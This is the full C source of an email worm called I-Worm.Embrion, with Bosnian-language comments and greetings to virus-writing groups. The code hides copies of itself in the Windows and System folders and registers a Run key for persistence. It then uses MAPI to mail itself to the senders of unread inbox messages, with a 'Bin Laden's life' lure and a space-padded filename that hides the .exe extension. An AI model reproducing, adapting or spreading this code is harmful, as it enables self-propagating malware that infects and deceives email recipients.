   //-----------------------------------------------------
   // Projekat Sintesys [ SPECIES VL ]
   //--------------------------------------------------------

   // I-Worm.Embrion by Specie

   /* Kao prvo ovo je moj prvi projekat u jednom globalnom
       projektu koji nosi naziv Projekat Sintesys.
   */

   /*
       Karakteristike crva:
      -------------------------------------------------------
      OS:               Win9x,NT,2K.
      Kompajler:        Borland C++ 5.0

      Ukratko receno crv se kopira u Win i Sys direktorij.
      Izvrsnu datoteku koju kopira u Sys direktorij crv
      koristi za "spridanje" na sve email adrese koje nadje
      u Inbox-u, dok onu koju je iskopirao u Win direktorij
      registruje u Run kljuc, tako da se starta pri svakom
      podizanju sistema. Prije "spridanja" crv odspava u
      memoriji 2 minute. Nema infektivnih metoda, niti nekih
      posebnih destruktivnih procedura.

      Sto se tice payload funkcija startaju se tokom cijelog
      Septembra time sto pokazuje poruku na sredini ekrana.
      Druga payload funkcija jeste da svakog Utorka u sedmici
      prikaze poruku sa njenim pripadajucim sadrzajem.

      Naravno, datoteke koje iskopira imaju Hidden atribute.
      -------------------------------------------------------

      OUTRO:

      Pozdravljam ovom prilikom svog kolegu AciDCookie-a,
      te naravno VX grupe kao sto su: 29A,SMF,BCVCG,Mions...
      Greetz to:
      GriYo, Vecna, RoadKill, Black_Cat, Perikles, SnowBlaze,
      GigaByte, Walrus, Smoothie, KnowDeth, LysKovick, f0re,
      BumbleBee, Benny, NexusCrus, gl_storm, PanoiX...
      and to all other ppl on #vxer and #vxtrader...
      Spec. greetz to BiHNet.ORG [ www.bihnet.org ]
   */


   #include "windows.h"
   #include "mapi.h"
   #include "memory.h"


   ULONG (PASCAL FAR *mSend)(ULONG, ULONG, MapiMessage*, FLAGS, ULONG);
   ULONG (PASCAL FAR *login)(ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPLHANDLE);
   ULONG (PASCAL FAR *mNext)(LHANDLE, ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPTSTR);
   ULONG (PASCAL FAR *mRead)(LHANDLE, ULONG, LPTSTR, FLAGS, ULONG, lpMapiMessage FAR *);
   ULONG (PASCAL FAR *LoginOff)(LHANDLE, ULONG, FLAGS, ULONG);
   ULONG (PASCAL FAR *mFree)(LPVOID);

   int PASCAL WinMain(HINSTANCE,HINSTANCE,LPSTR,int);

   //--------------------------------------------------------------------------------------
   // neke initijalizacije potrebne za daljnje izvrsavanje koda
   //--------------------------------------------------------------------------------------

   HDC                 dc;
   SYSTEMTIME      vrm;
   HINSTANCE       hndMejl;
   HKEY                runKljuc;
   LHANDLE         sesija;

   char vIme[256],
        windir[256],
        sysdir[256],
        poruka[] = "Kad sve izgleda da umire,...ono se ustvari radja!",
        mID[512];

   char bPoruka[1024],
        adresa[512];

   MapiMessage     *m;
   MSG                  mPo;

   //--------------------------------------------------------------------------------------
   // entry-point: pocetak svega nevaljalog...;)
   //--------------------------------------------------------------------------------------

   int PASCAL WinMain(HINSTANCE hint,
                            HINSTANCE hprev,
                      LPSTR lp,
                      int CShow)

   {

       GetModuleFileName(hint,vIme,256);                           // puno ime i prezime virusa! ;)


       GetWindowsDirectory(windir,sizeof(windir));             // ...do Windows direktorija!
      GetSystemDirectory(sysdir,sizeof(sysdir));               // ...do System direktorija!

                                                                      /* ovdje kopiramo potrebne
                                                                       stringove zbog CopyFile
                                                                                  API funkcije...*/
      strcat(windir,"\\Win32Dlw.EXE");
      strcat(sysdir,"\\Win32Exp.EXE");

      CopyFile(vIme,windir,FALSE);                                 // kopiraj Virus u Win direktorij
      CopyFile(vIme,sysdir,FALSE);                                 // kopiraj Virus u Sys direktorij
      SetFileAttributes(windir,FILE_ATTRIBUTE_HIDDEN);      // sakrij me....
      SetFileAttributes(sysdir,FILE_ATTRIBUTE_HIDDEN);      // sakrij i mene, ba!

                                                            /* ..eeeee sad malo Regea slusamo
                                                               i plesemo uz njega...LOL    */

       RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_WRITE,&runKljuc);
      RegSetValueEx(runKljuc,"RunExplorer",0,REG_SZ,(BYTE *)sysdir,256);
      RegCloseKey(runKljuc);
                                                            /* ovdje ide payload...
                                                              provjera sistemskog vremena...
                                                                               te payload funkcije ujedno...*/

      GetSystemTime(&vrm);
       if (vrm.wMonth == 9)
      {
       dc = GetDC(NULL);
         if (dc)
         {
            TextOut(dc,300,300,poruka,49);
         }
       ReleaseDC(NULL,dc);
      }
      if (vrm.wDayOfWeek == 2)
      {
           MessageBox(NULL,"Moja jutra su sve jasnija, \n"
                            "Moja snaga je prodornija,  \n"
                         "Moje rijeci silno odjekuju,\n"
                         "Moj mac je ostriji,        \n"
                         "Moje noci su sve hladnije. \n"
                         "...ali dan je blizi kad ce \n"
                         "ljudi shvatiti da su samo, \n"
                         "i nista drugo nego ono sto \n"
                         "sam i JA!","...",MB_OK);
      }

                                                                           /* sad malo prelazimo na mail funkcije
                                                                               znate i sami kako to biva...;)  */

   Sleep(60000*2);                                                     // prvo malo odspavaj (2 min.)


   hndMejl = LoadLibrary("MAPI32.DLL");                     // ucitavamo MAPI32.DLL...

                                                                               /* ovdje ucitavamo neke API funkcije
                                                                                   koje su nam potrebne za mail propagiranje crva */

   login=GetProcAddress(hndMejl, "MAPILogon");
   LoginOff=GetProcAddress(hndMejl, "MAPILogoff");
   mNext=GetProcAddress(hndMejl, "MAPIFindNext");
   mRead=GetProcAddress(hndMejl, "MAPIReadMail");
   mSend=GetProcAddress(hndMejl, "MAPISendMail");
   mFree=GetProcAddress(hndMejl, "MAPIFreeBuffer");


   login(NULL,NULL,NULL,MAPI_NEW_SESSION,NULL,&sesija);        // logujemo se...
   if(mNext(sesija,0,NULL,NULL,MAPI_UNREAD_ONLY,
            NULL,mID)==SUCCESS_SUCCESS)                       // nadjemo prvu adresu....
   {
   do {
      if(mRead(sesija,NULL,mID,MAPI_SUPPRESS_ATTACH |
      MAPI_PEEK,NULL,&m)==SUCCESS_SUCCESS)                     // procitamo je....
      SetThreadPriority(NULL,THREAD_PRIORITY_HIGHEST);     // prioritetnost procesa je na nivou ;)
      {
       strcpy(adresa,m->lpOriginator->lpszAddress);
       m->ulReserved=0;
       m->lpszSubject="Bin Ladenov zivot";
       m->lpszNoteText="Ako jos do sada niste znali ko je Bin Laden onda\n"
                               "vjerovatno cete naci ovaj dokument interesantnim\n"
                        "u kojem je prikazano nekoliko vaznih momenata u\n"
                        "u njegovom zivotu, cak dok je jos radio pri CIA!";
       m->lpszMessageType=NULL;
       m->lpszDateReceived=NULL;
       m->lpszConversationID=NULL;
       m->flFlags=MAPI_UNREAD;
       m->lpOriginator->ulReserved=0;
       m->lpOriginator->ulRecipClass=MAPI_ORIG;
       m->lpOriginator->lpszName=m->lpRecips->lpszName;
       m->lpOriginator->lpszAddress=m->lpRecips->lpszAddress;
       m->nRecipCount=1;
       m->lpRecips->ulReserved=0;
       m->lpRecips->ulRecipClass=MAPI_TO;
       m->lpRecips->lpszName=m->lpOriginator->lpszName;
       m->lpRecips->lpszAddress=adresa;
       m->nFileCount=1;
       m->lpFiles=(MapiFileDesc *)malloc(sizeof(MapiFileDesc));
       memset(m->lpFiles, 0, sizeof(MapiFileDesc));
       m->lpFiles->ulReserved=0;
       m->lpFiles->flFlags=NULL;
       m->lpFiles->nPosition=-1;
       m->lpFiles->lpszPathName=vIme;
       m->lpFiles->lpszFileName="Bin Ladenov Zivot                              .exe";  // kud ce extenzija, Boze dragi?
       m->lpFiles->lpFileType=NULL;
       mSend(sesija, NULL, m, NULL, NULL);                     // onda napravimo poruku i posaljemo je...
      }
   }while(mNext(sesija,0,NULL,mID,MAPI_UNREAD_ONLY,
                    NULL,mID)==SUCCESS_SUCCESS);                   // radi ovako sve dok ima adresa...

                                                                               /* ovdje oslobadjamo memoriju
                                                                                   da je glava ne zaboli   */

   free(m->lpFiles);
   mFree(m);
   LoginOff(sesija,0,0,0);
   FreeLibrary(hndMejl);
   }
   return 0;                                                // ...to be continued! ;)
   }
